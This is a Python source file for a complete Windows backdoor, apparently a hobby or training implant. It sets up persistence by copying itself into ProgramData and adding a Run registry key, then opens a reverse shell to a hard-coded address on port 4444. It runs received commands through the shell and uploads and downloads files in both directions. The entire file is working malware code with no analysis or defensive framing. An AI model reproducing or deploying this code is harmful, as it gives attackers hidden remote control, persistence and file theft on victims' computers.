import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time


class Backdoor:
    def __init__(self, ip, port):
        try:
            self.make_persistence()
        except Exception:
            pass
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def execute(self, commands):
        return subprocess.check_output(commands, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def recv_reliably(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + base64.b64decode(self.s.recv(1024)).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def send_reliably(self, result):
        json_obj = json.dumps(result.decode())  # result is in byte format so string
        self.s.send(base64.b64encode(json_obj.encode()))

    def change_directory(self, path):
        os.chdir(path)
        return "The present working directory is changed to " + path

    def send_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def make_persistence(self):
        location = r"C:\ProgramData\Internet31.exe"
        if not os.path.exists(location):
            shutil.copy(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v rand25323 /t REG_SZ /d "' + location + '"')

    def run(self):
        while True:
            try:
                commands = self.recv_reliably()
                if commands[0] == "exit":
                    self.s.close()
                    sys.exit()
                elif commands[0] == "cd" and len(commands) > 1:
                    i, c = len(commands) - 2, 2
                    while i > 0:
                        commands[1] = commands[1] + " " + commands[c]
                        c += 1
                        i -= 1
                    result = self.change_directory((commands[1]))
                    result = result.encode()
                elif commands[0] == "download":
                    result = self.send_file(commands[1])
                elif commands[0] == "upload":
                    result = self.write_file(commands[1], commands[2])
                    result = result.encode()
                else:
                    result = self.execute(commands)

            except Exception:
                result = "[-] Error in execution of command :("
                result = result.encode()
            self.send_reliably(result)  # here result is in byte format as subprocess returns in byte format


try:
    time.sleep(15)
    my_backdoor = Backdoor("192.168.43.237", 4444)
    my_backdoor.run()  # To run the program
except Exception:
    sys.exit()
